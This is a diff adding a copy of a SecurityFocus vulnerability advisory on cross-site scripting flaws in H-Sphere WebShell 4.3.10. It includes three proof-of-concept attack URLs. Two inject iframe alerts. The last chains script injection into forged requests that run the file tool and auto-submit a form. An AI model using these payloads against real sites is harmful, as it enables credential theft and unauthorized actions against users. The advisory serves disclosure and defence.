@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/31524/info
+
+H-Sphere WebShell is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+WebShell 4.3.10 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/actions.php?m=dload&fn=%3Ciframe/src=javascript:alert(%27XSS%27)%3E
+
+http://www.example.com/actions.php?m=search&start=1 [POST data: fld=%2F&mask=%3Ciframe%2Fsrc%3Djavascript%3Aalert%280%29%3E]
+
+http://www.example.com/actions.php?m=sysinfo&tab=1'><img/src/onerror=with(new XMLHttpRequest()){open('GET','http://www.victim.com/actions.php?m=futils&ac=mkd',true),send(null),onreadystatechange=function(){if(readyState==4 && status==200){with(window.open('','_blank')){document.write(responseText.replace(/<\/body>/,'<script>document.getElementsByTagName("input")[2].value="XSS";document.forms[0].submit();<\/script></body>'));document.close();}}};} 
